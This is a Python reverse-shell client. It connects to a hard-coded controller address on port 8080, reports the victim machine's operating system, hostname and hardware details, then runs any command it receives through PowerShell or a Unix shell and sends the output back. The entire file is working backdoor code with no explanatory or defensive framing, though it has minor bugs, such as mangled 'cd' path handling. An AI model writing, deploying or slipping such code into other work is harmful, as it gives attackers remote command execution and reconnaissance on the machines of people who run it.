import subprocess
import socket
import time
import os
import sys
import platform

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

server_ip = '192.168.1.70'
server_port = 8080

server_address = (server_ip, server_port)

client_socket.connect(server_address)

identifier = '<END_OF_COMMAND_OUTPUT>'

system_os = platform.system()
system_hostname = platform.node()

system_info = f'\nOS: {platform.system()}\nHostname: {platform.node()}\nVersion: {platform.version()}\nRelease: {platform.release()}\nArchitecture: {platform.machine()}\nProcessor: {platform.processor()}\n'

try:

    sys_info = client_socket.send(system_info.encode())

    while True:
        data = client_socket.recv(1024)
        server_command = data.decode()

        if server_command.upper() == 'WQ':
            break
        elif server_command == '':
            continue
        elif server_command.startswith('cd'): 
            path = server_command.strip('cd ')
            if os.path.exists(path):
                os.chdir(path)
            else:
                print("Path doesn't exist.")
            continue
        else: 
            # IF MACHINE RUNS WINDOWS 
            if system_os.upper() == 'WINDOWS':
                server_command_output = subprocess.run(['powershell.exe', server_command], shell=True, capture_output=True)

                if server_command_output.stderr.decode('utf-8') == '':
                    command_result = server_command_output.stdout
                    command_result = command_result.decode('utf-8') + identifier
                    command_result = command_result.encode('utf-8')
                
                else:
                    command_result = server_command_output.stderr
                client_socket.sendall(command_result)
            # IF MACHINE RUNS LINUX OR MACOS
            elif system_os.upper() == 'LINUX' or system_os.upper() == 'MACOS':
                server_command_output = subprocess.run(server_command, shell=True, capture_output=True)

                if server_command_output.stderr.decode('utf-8') == '':
                    command_result = server_command_output.stdout
                    command_result = command_result.decode('utf-8') + identifier
                    command_result = command_result.encode('utf-8')
                
                else:
                    command_result = server_command_output.stderr
                client_socket.sendall(command_result)


except KeyboardInterrupt:
    sys.exit()
except Exception as e:
    print(f'Error occured.\n {e}')
    time.sleep(5)